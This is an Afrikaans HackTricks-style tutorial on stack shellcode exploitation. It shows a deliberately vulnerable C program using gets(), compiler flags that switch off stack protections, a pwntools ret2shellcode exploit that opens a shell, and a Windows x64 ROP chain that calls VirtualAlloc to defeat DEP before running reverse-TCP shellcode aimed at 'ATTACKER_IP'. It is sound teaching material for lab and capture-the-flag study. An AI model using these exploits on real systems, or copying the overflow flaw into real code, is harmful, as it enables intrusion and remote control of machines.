# Stack Shellcode

{{#include ../../../banners/hacktricks-training.md}}

## Basiese Inligting

**Stack shellcode** is 'n tegniek wat in **binary exploitation** gebruik word waar 'n aanvaller shellcode na 'n kwesbare program se stack skryf en dan die **Instruction Pointer (IP)** of **Extended Instruction Pointer (EIP)** wysig om na die ligging van hierdie shellcode te wys, wat veroorsaak dat dit uitgevoer word. Dit is 'n klassieke metode wat gebruik word om ongemagtigde toegang te verkry of willekeurige opdragte op 'n teikenstelsel uit te voer. Hier is 'n uiteensetting van die proses, insluitend 'n eenvoudige C-voorbeeld en hoe jy 'n ooreenstemmende exploit met Python en **pwntools** kan skryf.

### C Voorbeeld: 'n Kwesbare Program

Kom ons begin met 'n eenvoudige voorbeeld van 'n kwesbare C-program:
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
char buffer[64];
gets(buffer); // Unsafe function that does not check for buffer overflow
}

int main() {
vulnerable_function();
printf("Returned safely\n");
return 0;
}
```
Hierdie program is kwesbaar vir 'n buffer overflow as gevolg van die gebruik van die `gets()` funksie.

### Kompilering

Om hierdie program te kompileer terwyl verskeie beskermings gedeaktiveer word (om 'n kwesbare omgewing na te boots), kan jy die volgende opdrag gebruik:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
- `-fno-stack-protector`: Skakel stack protection af.
- `-z execstack`: Maak die stack uitvoerbaar, wat nodig is om shellcode wat op die stack gestoor is uit te voer.
- `-no-pie`: Skakel Position Independent Executable (PIE) af, wat dit makliker maak om die geheueadres te voorspel waar ons shellcode sal wees.
- `-m32`: Kompileer die program as 'n 32-bit uitvoerbare, dikwels gebruik vir eenvoud in exploit development.

### Python Exploit met Pwntools

Hier is hoe jy 'n exploit in Python met **pwntools** kan skryf om 'n **ret2shellcode** attack uit te voer:
```python
from pwn import *

# Set up the process and context
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path
context.arch = 'i386' # Specify the architecture

# Generate the shellcode
shellcode = asm(shellcraft.sh()) # Using pwntools to generate shellcode for opening a shell

# Find the offset to EIP
offset = cyclic_find(0x6161616c) # Assuming 0x6161616c is the value found in EIP after a crash

# Prepare the payload
# The NOP slide helps to ensure that the execution flow hits the shellcode.
nop_slide = asm('nop') * (offset - len(shellcode))
payload = nop_slide + shellcode
payload += b'A' * (offset - len(payload))  # Adjust the payload size to exactly fill the buffer and overwrite EIP
payload += p32(0xffffcfb4) # Supossing 0xffffcfb4 will be inside NOP slide

# Send the payload
p.sendline(payload)
p.interactive()
```
Hierdie skrip bou 'n payload wat bestaan uit 'n **NOP slide**, die **shellcode**, en oorskryf dan die **EIP** met die adres wat na die NOP slide wys, wat verseker dat die shellcode uitgevoer word.

Die **NOP slide** (`asm('nop')`) word gebruik om die kans te vergroot dat die uitvoering na ons shellcode sal "slide" ongeag die presiese adres. Stel die `p32()` argument aan na die beginadres van jou buffer plus 'n offset om in die NOP slide te beland.

## Windows x64: Bypass NX with VirtualAlloc ROP (ret2stack shellcode)

Op moderne Windows is die stack nie-uitvoerbaar nie (DEP/NX). 'n Algemene manier om steeds stack-resident shellcode ná 'n stack BOF uit te voer, is om 'n 64-bit ROP-ketting te bou wat VirtualAlloc (of VirtualProtect) vanaf die module Import Address Table (IAT) aanroep om 'n area van die stack uitvoerbaar te maak en dan terug te keer na die shellcode wat ná die ketting aangeheg is.

Key points (Win64 calling convention):
- VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
- RCX = lpAddress → kies 'n adres in die huidige stack (bv. RSP) sodat die nuut-geallokeerde RWX-streek oorvleuel met jou payload
- RDX = dwSize → groot genoeg vir jou ketting + shellcode (bv. 0x1000)
- R8  = flAllocationType = MEM_COMMIT (0x1000)
- R9  = flProtect = PAGE_EXECUTE_READWRITE (0x40)
- Return directly into the shellcode placed right after the chain.

Minimal strategy:
1) Leak 'n module base (bv. via 'n format-string, object pointer, ens.) om absolute gadget- en IAT-adresse onder ASLR te bereken.
2) Vind gadgets om RCX/RDX/R8/R9 te laai (pop- of mov/xor-gebaseerde reekse) en 'n call/jmp [VirtualAlloc@IAT]. As jy nie direkte pop r8/r9 het nie, gebruik aritmetiese gadgets om konstantes te sintetiseer (bv. stel r8=0 en tel herhaaldelik r9 by met 0x40 veertig keer om 0x1000 te bereik).
3) Plaas stage-2 shellcode onmiddellik na die ketting.

Example layout (conceptual):
```
# ... padding up to saved RIP ...
# R9 = 0x40 (PAGE_EXECUTE_READWRITE)
POP_R9_RET; 0x40
# R8 = 0x1000 (MEM_COMMIT) — if no POP R8, derive via arithmetic
POP_R8_RET; 0x1000
# RCX = &stack (lpAddress)
LEA_RCX_RSP_RET    # or sequence: load RSP into a GPR then mov rcx, reg
# RDX = size (dwSize)
POP_RDX_RET; 0x1000
# Call VirtualAlloc via the IAT
[IAT_VirtualAlloc]
# New RWX memory at RCX — execution continues at the next stack qword
JMP_SHELLCODE_OR_RET
# ---- stage-2 shellcode (x64) ----
```
Met 'n beperkte gadget-stel kan jy registerwaardes indirek saamstel, byvoorbeeld:
- mov r9, rbx; mov r8, 0; add rsp, 8; ret → stel r9 van rbx, maak r8 nul, en kompenseer die stack met 'n rommel qword.
- xor rbx, rsp; ret → laai rbx met die huidige stack pointer.
- push rbx; pop rax; mov rcx, rax; ret → skuif 'n RSP-afgeleide waarde na RCX.

Pwntools-voorbeeld (gegee 'n bekende base en gadgets):
```python
from pwn import *
base = 0x7ff6693b0000
IAT_VirtualAlloc = base + 0x400000  # example: resolve via reversing
rop  = b''
# r9 = 0x40
rop += p64(base+POP_RBX_RET) + p64(0x40)
rop += p64(base+MOV_R9_RBX_ZERO_R8_ADD_RSP_8_RET) + b'JUNKJUNK'
# rcx = rsp
rop += p64(base+POP_RBX_RET) + p64(0)
rop += p64(base+XOR_RBX_RSP_RET)
rop += p64(base+PUSH_RBX_POP_RAX_RET)
rop += p64(base+MOV_RCX_RAX_RET)
# r8 = 0x1000 via arithmetic if no pop r8
for _ in range(0x1000//0x40):
rop += p64(base+ADD_R8_R9_ADD_RAX_R8_RET)
# rdx = 0x1000 (use any available gadget)
rop += p64(base+POP_RDX_RET) + p64(0x1000)
# call VirtualAlloc and land in shellcode
rop += p64(IAT_VirtualAlloc)
rop += asm(shellcraft.amd64.windows.reverse_tcp("ATTACKER_IP", ATTACKER_PORT))
```
Wenke:
- VirtualProtect werk soortgelyk as dit verkieslik is om 'n bestaande buffer RX te maak; die parameterorde is anders.
- As die stack-ruimte beperk is, ken RWX elders toe (RCX=NULL) en jmp na daardie nuwe streek in plaas daarvan om die stack te hergebruik.
- Reken altyd op gadgets wat RSP aanpas (e.g., add rsp, 8; ret) deur junk qwords in te voeg.


- [**ASLR**](../../common-binary-protections-and-bypasses/aslr/index.html) **moet gedeaktiveer word** sodat die adres oor uitvoerings heen betroubaar is; anders sal die adres waar die funksie gestoor word nie altyd dieselfde wees nie en jy sal 'n leak nodig hê om uit te vind waar die win function gelaai is.
- [**Stack Canaries**](../../common-binary-protections-and-bypasses/stack-canaries/index.html) moet ook gedeaktiveer word, anders sal die gekompromitteerde EIP return address nooit gevolg word nie.
- [**NX**](../../common-binary-protections-and-bypasses/no-exec-nx.md) **stack** beskerming sal die uitvoering van die shellcode binne die stack verhinder omdat daardie gebied nie uitvoerbaar sal wees nie.

## Ander Voorbeelde & Verwysings

- [https://ir0nstone.gitbook.io/notes/types/stack/shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode)
- [https://guyinatuxedo.github.io/06-bof_shellcode/csaw17_pilot/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/csaw17_pilot/index.html)
- 64bit, ASLR met stack address leak, skryf shellcode en spring daarheen
- [https://guyinatuxedo.github.io/06-bof_shellcode/tamu19_pwn3/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/tamu19_pwn3/index.html)
- 32-bit, ASLR met stack leak, skryf shellcode en spring daarheen
- [https://guyinatuxedo.github.io/06-bof_shellcode/tu18_shellaeasy/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/tu18_shellaeasy/index.html)
- 32-bit, ASLR met stack leak, vergelyking om oproep na exit() te voorkom, oorskryf 'n veranderlike met 'n waarde, skryf shellcode en spring daarheen
- [https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/](https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/)
- arm64, geen ASLR, ROP gadget om die stack uitvoerbaar te maak en na shellcode in die stack te spring


## Verwysings

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE)](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [VirtualAlloc documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)

{{#include ../../../banners/hacktricks-training.md}}
